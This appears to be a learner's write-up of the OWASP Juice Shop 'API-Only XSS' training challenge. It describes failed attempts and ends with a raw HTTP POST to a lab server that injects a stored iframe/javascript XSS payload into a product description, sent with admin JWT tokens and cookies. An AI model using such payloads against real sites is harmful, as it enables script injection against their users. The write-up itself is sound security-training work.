# API-Only XSS
**Description**
Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> without using the frontend application at all.

Style: Danger Zone, With Coding Challenge
Topic: XSS

## Solutions

### Web Solution

The payload we want to inject:
```html
<iframe src="javascript:alert(`xss`)">
```
Ok, so we want a persisted XSS, something that sits on the "DB".

Also we must use API only, therefore we must find an API call that can generate content on the webfrontend

Enumeration (using `admin@juice-sh.op`)

#### At `/#/administration`
we have a `Customer Feedback` table, with a list of customer feedbacks.

Tried it completely ignored the vulnerable iframe data...

We also have registered users (which might be interesting place to register a user which it email is iframe...)

Also under the *All Products* page, there are reviews for products that can be submitted and updated.

Tried, pasted as strings..

Under our username, there is also a page we can assign `admin@juice-sh.op` a username. it might be vulnerable as well.

Tried this and received a sanitized output (censored at part).

After many failure, I quit and looked the solution online.

Did this, received `201 Created` and it didn't change anything when I refreshed product search

```python
POST /api/Products/ HTTP/1.1
Host: 172.29.63.151:3000
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiJyYz1cImphdmFzY3JpcHQ6YWxlcnQoYHhzc2ApXCI-IiwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMDE5MjAyM2E3YmJkNzMyNTA1MTZmMDY5ZGYxOGI1MDAiLCJyb2xlIjoiYWRtaW4iLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMTcyLjI5LjQ4LjEiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDYtMTMgMDg6MzU6NTYuMDQ5ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDYtMTMgMDk6MzQ6MzguMDA1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc4MTM0NTE4MX0.SAy6WPOSQU9kZcvqbP-m6H63uEgTY2UHr11Qt9Gphpwo7zqzUSnI8v8c7XOFTtuHtz2rvbF5xaSJ4bv7OA2fZD8aMeXiKUJFQjsGH5xs1n5v64y0YlQMmBmyrsVHWKBjR2Jc5t5oXSln70oyLWlqaEywDLuneDMh-beMitQ1zco
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Referer: http://172.29.63.151:3000/
Accept-Encoding: gzip, deflate, br
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCodeFindIt=6PbROWQmob21dLnN57ew3PkXg4Eas7qHyk496lxpz0MGBYEDjVKvrqJyago3; continueCodeFixIt=RokV2QmyD43pBeP5v06KYXLdgx23fWZC8jAE7nMwWNqjklzoZrG9ORJ8bzQJ; show_tool_calls=false; continueCode=7zaX8PZV0agHRcls3ckSjtWWhvVc6oTN7tqQTP5cW3IQ5cJeUR6dEJDYpKkO; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiJyYz1cImphdmFzY3JpcHQ6YWxlcnQoYHhzc2ApXCI-IiwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMDE5MjAyM2E3YmJkNzMyNTA1MTZmMDY5ZGYxOGI1MDAiLCJyb2xlIjoiYWRtaW4iLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiMTcyLjI5LjQ4LjEiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDYtMTMgMDg6MzU6NTYuMDQ5ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDYtMTMgMDk6MzQ6MzguMDA1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc4MTM0NTE4MX0.SAy6WPOSQU9kZcvqbP-m6H63uEgTY2UHr11Qt9Gphpwo7zqzUSnI8v8c7XOFTtuHtz2rvbF5xaSJ4bv7OA2fZD8aMeXiKUJFQjsGH5xs1n5v64y0YlQMmBmyrsVHWKBjR2Jc5t5oXSln70oyLWlqaEywDLuneDMh-beMitQ1zco
If-None-Match: W/"40c2-1gO5Dx3lOxYCp4dkrGwDLn1QAlY"
Content-Length: 90

{
    "name":"XSS",
    "description":"<iframe src=\"javascript:alert('xss')\">", 
    "price": 47.11
}
```

COULDN"T MAKE THIS WORK FROM ME